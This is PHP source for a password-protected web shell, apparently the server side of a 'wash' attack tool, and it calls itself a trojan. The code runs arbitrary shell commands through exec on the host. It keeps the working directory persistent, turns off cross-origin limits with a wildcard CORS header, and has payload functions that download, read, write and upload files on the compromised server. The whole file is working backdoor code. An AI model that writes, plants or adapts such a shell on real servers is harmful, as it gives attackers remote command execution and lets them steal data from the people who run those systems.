<?php

class Trojan{
    private $command  = '';
    private $cwd      = '';
    private $response = array(
        'error'          => null,
        'output'         => null,
        'prompt_context' => null,
    );

    /**
     * A generic constructor
     */
    public function __construct(){
        # emulate cwd persistence
        if(isset($_SESSION['cwd'])){
            $this->cwd = $_SESSION['cwd'];
        } else {
            $this->cwd = trim(`pwd`);
        }
        # require that a context always be set
        $this->response['prompt_context'] = $this->get_prompt_context();
    }

    /**
     * Processes commands sent from the wash client
     *
     * @param string $json             JSON from the wash client
     */
    public function process_command($json){
        # if the specified action was 'shell', pipe the command directly into
        # the web shell.
        if($json['action'] == 'shell'){
            $this->process_shell_command($json['cmd']);
        }

        # otherwise, simply invoke the method directly
        else {
            # metaprogramming FTW
            $method = $json['action'];

            # verify that the method exists before attempting to invoke it
            if(method_exists($this, $method)){
                $this->$method($json['args']);
            }
            # if the method doesn't exist, send back an error message
            else {
                $this->response = array(
                    'error'          => "wash error: the method $method is not supported by the trojan.",
                    'output'         => "wash error: the method $method is not supported by the trojan.",
                    'prompt_context' => $this->prompt_context,
                );
                $this->send_response();
            }
        }
    }

    /**
     * Processes a command from the wash client
     *
     * @param string $command          A command - this will change
     * @bug: When redirecting output to a file, errors are not reported to the 
     * shell. This happens because stderr is being directed to stdout, which is 
     * in turn being redirected into a file. If the error that was to be 
     * reported was that the redirect file could not be created, however, 
     * output just goes to a black hole. @see Github issue #38.
     */
    private function process_shell_command($command){
        # buffer the command from the client, in case we ever want to refer
        # back to it
        $this->command = $command;

        /* @note: In order to get current directory persistence to work, I need 
         * to inject some `cd` and `pwd` commands around the command sent from 
         * the wash client. */
        $command    = "cd {$this->cwd}; $command 2>&1; pwd";
        $output_raw = array();
        exec($command, $output_raw);

        # buffer the results
        $this->cwd      = array_pop($output_raw);
        $this->response = array(
            'output'         => join($output_raw, "\n"),
            'prompt_context' => $this->get_prompt_context(),
        );

        # save the cwd
        $_SESSION['cwd'] = $this->cwd;

        # send the response
        $this->send_response();
    }

    /**
     * Sends a response back to the wash client
     */
    private function send_response(){
        /* This header prevents the wash client from malfunctioning due to the 
         * Same-Origin Policy. @see: http://enable-cors.org/ */
        header('Access-Control-Allow-Origin: *');

        # assemble and send a JSON-encoded response
        echo json_encode($this->response);
        die();
    }

    /**
     * Assembles the prompt context to return to the wash client
     *
     * @return string $prompt_context  The prompt context
     */
    private function get_prompt_context(){
        // assemble the prompt context
        $whoami               =  trim(`whoami`);
        $hostname             =  gethostname();
        $line_terminator      =  ($whoami ===  'root') ? '#' : '$' ;
        $this->prompt_context =  "{$whoami}@{$hostname}:{$this->cwd}{$line_terminator}";
        return $this->prompt_context;
    }




    /*************************************************************************
     * Payload functions are from here downward
     *************************************************************************
    /**
     * Downloads a file
     *
     * @param string $args             Arguments passed from the wash client
     */
    public function payload_file_down($args){
        # emulate directory persistence
        chdir($this->cwd);
        # if the requested file exists, serve it up to the user
        if(file_exists($args['file'])){
            header('Content-Description: File Transfer');
            //header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename='.basename($args['file']));
            header('Content-Transfer-Encoding: binary');
            //header('Expires: 0');
            //header('Cache-Control: must-revalidate');
            //header('Pragma: public');
            //header('Content-Length: ' . filesize($args['file']));
            readfile($args['file']);
        }
        
        # if not, provide a notification
        else { echo "The requested file does not exist."; }
        die();
    }

    /**
     * Edits a file on the server
     */
    public function payload_file_read($args){
        # cd to the appropriate directory
        chdir($this->cwd);

        # Verify that file exists and is readable. (I'm combining these rather
        # than doing them separately just to keep the trojan as small as
        # possible.)
        if(!is_readable($args['file'] || !file_exists($args['file']))){
            $this->response = array(
                'error'          => 'The specified file is not readable or does not exist.',
                'prompt_context' => $this->prompt_context,
            );
            $this->send_response();
        }

        # double-up on the output here
        $output = array(
            # echo back the contents of the file
            'output' => file_get_contents($args['file']),
            # also pass back the absolute path to the file being read
            'file'   => realpath($args['file']),
        );
        $this->response = array(
            'output'         => $output,
            'prompt_context' => $this->prompt_context,
        );
        $this->send_response();
    }

    /**
     * Uploads files to the target server
     */
    public function payload_file_up($args){
        $out = json_encode($_FILES);

        # assemble a response
        $this->response = array(
            'output'         => $out,
            'prompt_context' => $this->prompt_context,
        );

        $this->send_response();
    }

    /**
     * Writes a file to the server
     */
    public function payload_file_write($args){
        # cd to the appropriate directory
        chdir($this->cwd);

        # Attempt to write the file, and notify the user of the result. Again,
        # I'm combining several error checks here just to keep the trojan small.
        if(file_put_contents($args['file'], $args['data']) === false){
            $this->response['error'] = 'Failed to write file. It may not be writable, or may not exist.';
        }
        else {
            $this->response['output'] = 'File written successfully.';
        }
        $this->response['prompt_context'] = $this->prompt_context;
        $this->send_response();
    }

    /**
     * Downloads a file
     *
     * @param string $args             Arguments passed from the wash client
     */
    public function payload_image_view($args){
        # emulate directory persistence
        chdir($this->cwd);

        # if the requested file exists, serve it up to the user
        if(file_exists($args['file'])){
            # extract some image information
            $image_data = getimagesize($args['file']);
            header("Content-Type: {$image_data['mime']}");
            //header("Expires: 0");
            //header("Cache-Control: must-revalidate");
            //header("Pragma: public");
            //header("Content-Length: " . filesize($file));
            readfile($args['file']);
        }
        
        # if not, provide a notification
        else { echo "The requested file does not exist."; }
        die();
    }
}

/* ---------- Procedural code starts here ---------- */
session_start();
$trojan = new Trojan();

# only process the command if a valid password has been specified
if(sha1($_REQUEST['args']['password'] . '<%= locks[:one][:salt] %>') === '<%= locks[:one][:hash] %>'){ 
    $trojan->process_command($_REQUEST);
}

# otherwise, just spit back an error message
else { 
    die(json_encode(
        array(
            'error'          => 'Invalid password.',
            'prompt_context' => 'wash>',
        )
    ));
}
